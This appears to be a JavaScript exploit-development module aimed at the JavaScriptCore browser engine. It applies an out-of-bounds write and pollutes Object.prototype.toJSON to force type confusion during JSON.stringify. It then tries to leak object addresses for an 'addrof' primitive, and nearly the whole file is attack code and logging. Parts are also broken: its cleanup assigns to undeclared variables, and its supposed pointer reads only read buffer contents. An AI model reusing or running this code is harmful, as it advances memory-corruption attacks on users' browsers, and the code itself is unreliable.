// js/script3/testArrayBufferVictimCrash.mjs (v55_LeakTargetAsThis)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V55_LTAT = "OriginalHeisenbug_TypedArrayAddrof_v55_LeakTargetAsThis";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v55 = null; // Será um ArrayBuffer
let object_to_leak_B_v55 = null; // Será um DataView

let victim_typed_array_ref_v55 = null;
let probe_call_count_v55 = 0;
let all_probe_interaction_details_v55 = [];
let first_call_details_object_ref_v55 = null;

const PROBE_CALL_LIMIT_V55 = 10;

function toJSON_TA_Probe_LeakTargetAsThis_v55() {
    probe_call_count_v55++;
    const call_num = probe_call_count_v55;
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v55_LeakTargetAsThis",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v55),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v55 && first_call_details_object_ref_v55 !== null),
        this_is_leak_target_A: (this === object_to_leak_A_v55 && object_to_leak_A_v55 !== null),
        this_is_leak_target_B: (this === object_to_leak_B_v55 && object_to_leak_B_v55 !== null),
        payload_A_assigned_to_C1: false,
        payload_B_assigned_to_C1: false,
        addrof_attempt_val: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1Details? ${current_call_details.this_is_C1_details_obj}. IsLeakTargetA? ${current_call_details.this_is_leak_target_A}. IsLeakTargetB? ${current_call_details.this_is_leak_target_B}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V55) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v55.push(current_call_details);
            return { recursion_stopped_v55: true, call: call_num };
        }

        // Caso 1: 'this' é a vítima original (primeira chamada)
        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Storing C1_details ref.`, "info");
            first_call_details_object_ref_v55 = current_call_details;
            all_probe_interaction_details_v55.push(current_call_details);
            return current_call_details; // Retorna C1_details
        }
        // Caso 2: 'this' é o C1_details (type-confused)
        else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS_OBJECT ('this')! Assigning leak targets...`, "vuln");
            if (object_to_leak_A_v55) { // object_to_leak_A_v55 é o ArrayBuffer
                this.payload_A = object_to_leak_A_v55;
                current_call_details.payload_A_assigned_to_C1 = true;
            }
            if (object_to_leak_B_v55) { // object_to_leak_B_v55 é o DataView
                this.payload_B = object_to_leak_B_v55;
                current_call_details.payload_B_assigned_to_C1 = true;
            }
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: C1_details modified. Keys: ${Object.keys(this).join(',')}`, "info");
            all_probe_interaction_details_v55.push(current_call_details);
            return this; // Retorna C1_details modificado
        }
        // Caso 3: 'this' É o nosso ArrayBuffer alvo de leak
        else if (current_call_details.this_is_leak_target_A && current_call_details.this_type === '[object ArrayBuffer]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET ArrayBuffer! Attempting to read internal pointer...`, "critical");
            let leaked_val = null;
            try {
                let view_on_this_target = new DataView(this); // 'this' é o ArrayBuffer
                const offset_to_read = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET; // 0x10
                if (view_on_this_target.byteLength < (offset_to_read + 8)) {
                    throw new RangeError(`Target ArrayBuffer too small (${view_on_this_target.byteLength} bytes) to read 8 bytes from offset ${toHex(offset_to_read)}.`);
                }
                let low = view_on_this_target.getUint32(offset_to_read, true);
                let high = view_on_this_target.getUint32(offset_to_read + 4, true);
                let int64_val = new AdvancedInt64(low, high);
                let temp_buffer = new ArrayBuffer(8); (new Uint32Array(temp_buffer))[0] = int64_val.low(); (new Uint32Array(temp_buffer))[1] = int64_val.high();
                leaked_val = (new Float64Array(temp_buffer))[0];

                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Read from TARGET ArrayBuffer at offset ${toHex(offset_to_read)}. Leaked: ${int64_val.toString(true)} (as double: ${leaked_val})`, "vuln");
                current_call_details.addrof_attempt_val = leaked_val;
                all_probe_interaction_details_v55.push(current_call_details);
                return { leaked_address_v55: leaked_val, leaked_obj_type: current_call_details.this_type, from_offset: toHex(offset_to_read) };
            } catch (e_leak) {
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR during pointer extraction from TARGET ArrayBuffer: ${e_leak.name} - ${e_leak.message}`, "error");
                current_call_details.error_in_probe = e_leak.message;
                all_probe_interaction_details_v55.push(current_call_details);
                return { addrof_error_v55: e_leak.message, type: current_call_details.this_type };
            }
        }
        // Caso 4: 'this' É o nosso DataView alvo de leak
        else if (current_call_details.this_is_leak_target_B && current_call_details.this_type === '[object DataView]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET DataView! Attempting to read internal pointer...`, "critical");
            let leaked_val = null;
            try {
                let view_on_this_target = this; // 'this' já é o DataView
                const offset_to_read = JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x10 para DataView m_vector
                if (view_on_this_target.byteLength < (offset_to_read + 8)) { // byteLength da DataView em si
                    throw new RangeError(`Target DataView too small (${view_on_this_target.byteLength} bytes) to read 8 bytes from offset ${toHex(offset_to_read)}.`);
                }
                let low = view_on_this_target.getUint32(offset_to_read, true);
                let high = view_on_this_target.getUint32(offset_to_read + 4, true);
                let int64_val = new AdvancedInt64(low, high);
                let temp_buffer = new ArrayBuffer(8); (new Uint32Array(temp_buffer))[0] = int64_val.low(); (new Uint32Array(temp_buffer))[1] = int64_val.high();
                leaked_val = (new Float64Array(temp_buffer))[0];

                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Read from TARGET DataView at offset ${toHex(offset_to_read)}. Leaked: ${int64_val.toString(true)} (as double: ${leaked_val})`, "vuln");
                current_call_details.addrof_attempt_val = leaked_val;
                all_probe_interaction_details_v55.push(current_call_details);
                return { leaked_address_v55: leaked_val, leaked_obj_type: current_call_details.this_type, from_offset: toHex(offset_to_read) };
            } catch (e_leak) {
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR during pointer extraction from TARGET DataView: ${e_leak.name} - ${e_leak.message}`, "error");
                current_call_details.error_in_probe = e_leak.message;
                all_probe_interaction_details_v55.push(current_call_details);
                return { addrof_error_v55: e_leak.message, type: current_call_details.this_type };
            }
        }
        // Caso 5: 'this' é um [object Object] genérico (não C1_details e não um de nossos alvos de leak diretos)
        else if (current_call_details.this_type === '[object Object]') {
             logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is an UNEXPECTED [object Object]. No special action.`, "warn");
             all_probe_interaction_details_v55.push(current_call_details);
             return this; // Retornar para ver se é processado
        }
        // Caso 6: Outros tipos
        else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected type: ${current_call_details.this_type}.`, "warn");
            all_probe_interaction_details_v55.push(current_call_details);
            return { generic_marker_v55: call_num };
        }
    } catch (e) {
        current_call_details.error_in_probe = e.message;
        // Corrigindo a referência do nome do teste no log de erro
        const FNAME_CURRENT_TEST_REF = FNAME_MODULE_TYPEDARRAY_ADDROF_V55_LTAT;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: CRITICAL ERROR in probe: ${e.name} - ${e.message}`, "critical", FNAME_CURRENT_TEST_REF);
        all_probe_interaction_details_v55.push(current_call_details);
        return { error_marker_v55: call_num };
    }
}

export async function executeTypedArrayVictimAddrofTest_LeakTargetAsThis() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V55_LTAT}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (LeakTargetAsThis) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V55_LTAT} Init...`;

    probe_call_count_v55 = 0;
    all_probe_interaction_details_v55 = [];
    victim_typed_array_ref_v55 = null;
    first_call_details_object_ref_v55 = null;

    object_to_leak_A_v55 = new ArrayBuffer(0x70); // Tamanho aumentado
    object_to_leak_B_v55 = new DataView(new ArrayBuffer(0x70)); // Tamanho aumentado

    let errorCapturedMain = null;
    let rawStringifyOutput = null;
    let stringifyOutput_parsed = null;

    let addrof_A_result = { success: false, msg: "Addrof ArrayBuffer: Default (v55)" };
    let addrof_B_result = { success: false, msg: "Addrof DataView: Default (v55)" };
    const fillPattern = 0.55555555555555;

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v55 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        // ... preenchimento do buffer ...

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_LeakTargetAsThis_v55, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v55)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v55);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);

            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Expected if circular. Output: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }

            let heisenbugOnC1 = false;
            const call2Details = all_probe_interaction_details_v55.find(d => d.call_number === 2 && d.this_is_C1_details_obj);
            if (call2Details && (call2Details.payload_A_assigned_to_C1 || call2Details.payload_B_assigned_to_C1)) {
                heisenbugOnC1 = true;
                logS3(`  EXECUTE: HEISENBUG on C1_details (Call #2) & PAYLOAD ASSIGNMENT CONFIRMED!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug on C1_details (Call #2) or payload assignment NOT confirmed.`, "error", FNAME_CURRENT_TEST);
            }

            logS3("STEP 3: Checking for leaked addresses (v55)...", "warn", FNAME_CURRENT_TEST);

            // A análise agora foca se 'leaked_address_v55' foi retornado pela sonda
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.leaked_address_v55 !== undefined) {
                const leaked_addr_val = stringifyOutput_parsed.leaked_address_v55;
                const obj_type = stringifyOutput_parsed.leaked_obj_type;
                const from_offset = stringifyOutput_parsed.from_offset;

                logS3(`  V55_ANALYSIS: Found 'leaked_address_v55' in stringifyOutput. Type: ${obj_type}, From Offset: ${from_offset}`, "good");
                if (typeof leaked_addr_val === 'number' && !isNaN(leaked_addr_val) && leaked_addr_val !== 0) {
                    let p_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([leaked_addr_val]).buffer)[0], new Uint32Array(new Float64Array([leaked_addr_val]).buffer)[1]);
                    if (p_int64.high() > 0x70000000 || p_int64.low() > 0x10000000 || (p_int64.high() & 0xFF000000) === 0x80000000) {
                        if (obj_type === '[object ArrayBuffer]') {
                            addrof_A_result.success = true; addrof_A_result.msg = `V55 SUCCESS (Direct Read from Target ArrayBuffer): ${p_int64.toString(true)} from ${from_offset}`;
                        } else if (obj_type === '[object DataView]') {
                            addrof_B_result.success = true; addrof_B_result.msg = `V55 SUCCESS (Direct Read from Target DataView): ${p_int64.toString(true)} from ${from_offset}`;
                        }
                    } else {
                        const msg = `V55 DirectRead from ${obj_type} is num but not ptr pattern: ${p_int64.toString(true)}`;
                        if (obj_type === '[object ArrayBuffer]') addrof_A_result.msg = msg; else addrof_B_result.msg = msg;
                    }
                } else {
                     const msg = `V55 DirectRead from ${obj_type} value not useful num: ${JSON.stringify(leaked_addr_val)}`;
                     if (obj_type === '[object ArrayBuffer]') addrof_A_result.msg = msg; else addrof_B_result.msg = msg;
                }
            } else if (stringifyOutput_parsed && stringifyOutput_parsed.parse_error && rawStringifyOutput.includes("circular structure")) {
                 addrof_A_result.msg = "V55 Raw stringify had 'circular structure'. Addrof via this path failed.";
                 addrof_B_result.msg = "V55 Raw stringify had 'circular structure'. Addrof via this path failed.";
            }
             else {
                if (!addrof_A_result.success) addrof_A_result.msg = "V55 No 'leaked_address_v55' in stringifyOutput.";
                if (!addrof_B_result.success) addrof_B_result.msg = "V55 No 'leaked_address_v55' in stringifyOutput.";
            }


            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V55_LTAT}: Addr SUCCESS!`;
            } else if (heisenbugOnC1) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V55_LTAT}: C1_TC OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V55_LTAT}: No C1_TC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V55_LTAT}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_outer_main.name} - ${e_outer_main.message}${e_outer_main.stack ? '\n'+e_outer_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V55_LTAT} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v55}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v55 = null;
        all_probe_interaction_details_v55 = [];
        probe_call_count_v55 = 0;
        first_call_details_object_ref_v55 = null;
        object_to_leak_A_v55 = null;
        object_to_leak_B_v55 = null;
        leak_target_buffer_v55 = null;
        leak_target_dataview_v55 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError',
        stringifyResult: stringifyOutput_parsed,
        rawStringifyForAnalysis: rawStringifyOutput,
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v55],
        total_probe_calls: probe_call_count_v55,
        addrof_A_result: addrof_A_result,
        addrof_B_result: addrof_B_result
    };
};
